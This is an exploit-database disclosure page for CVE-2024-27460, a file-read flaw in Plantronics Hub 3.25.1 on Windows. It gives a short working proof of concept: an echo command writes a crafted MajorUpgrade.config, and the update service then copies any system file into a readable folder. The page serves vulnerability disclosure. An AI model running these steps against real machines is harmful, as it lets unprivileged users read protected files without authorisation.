---
title: Plantronics Hub 3.25.1 Arbitrary File Read
url: https://cxsecurity.com/issue/WLB-2024050048
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-17
fetch_date: 2025-10-06T17:13:39.703781
---

# Plantronics Hub 3.25.1 Arbitrary File Read

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Plantronics Hub 3.25.1 Arbitrary File Read** **2024.05.16**  Credit:  **[Alaa Kachouh](https://cxsecurity.com/author/Alaa%2BKachouh/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-27460](https://cxsecurity.com/cveshow/CVE-2024-27460/ "Click to see CVE-2024-27460")**  CWE: **[CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")** | |

# Exploit Title: Plantronics Hub 3.25.1 – Arbitrary File Read
# Date: 2024-05-10
# Exploit Author: Farid Zerrouk from Deloitte Belgium, Alaa Kachouh from
Mastercard
# Vendor Homepage:
https://support.hp.com/us-en/document/ish\_9869257-9869285-16/hpsbpy03895
# Version: Plantronics Hub for Windows version 3.25.1
# Tested on: Windows 10/11
# CVE : CVE-2024-27460
As a regular user drop a file called "MajorUpgrade.config" inside the
"C:\ProgramData\Plantronics\Spokes3G" directory. The content of
MajorUpgrade.config should look like the following one liner:
^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
Exchange <FULL-PATH-TO-YOUR-DESIRED-FILE> with a desired file to read/copy
(any file on the system). The desired file will be copied into C:\Program
Files (x86)\Plantronics\Spokes3G\UpdateServiceTemp
Steps to reproduce (POC):
- Open cmd.exe
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo ^|^|<FULL-PATH-TO-YOUR-DESIRED-FILE>^|> MajorUpgrade.config
- Desired file will be copied into C:\Program Files
(x86)\Plantronics\Spokes3G\UpdateServiceTemp

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050048)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top